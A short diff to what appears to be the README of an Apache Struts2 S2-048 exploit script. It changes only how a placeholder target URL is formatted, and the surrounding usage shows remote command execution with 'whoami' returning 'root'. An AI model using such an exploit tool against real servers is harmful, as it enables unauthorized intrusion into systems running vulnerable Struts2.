@@ -10,7 +10,7 @@ https://cwiki.apache.org/confluence/display/WW/S2-048
 ```bash
 > python St2-048.py
 
-set url :[http://xx.xx.xx.xx:port/integration/saveGangster.action](http://xx.xx.xx.xx:port/integration/saveGangster.action)
+set url : http://xx.xx.xx.xx:port/integration/saveGangster.action
 
 cmd >>: whoami
 root
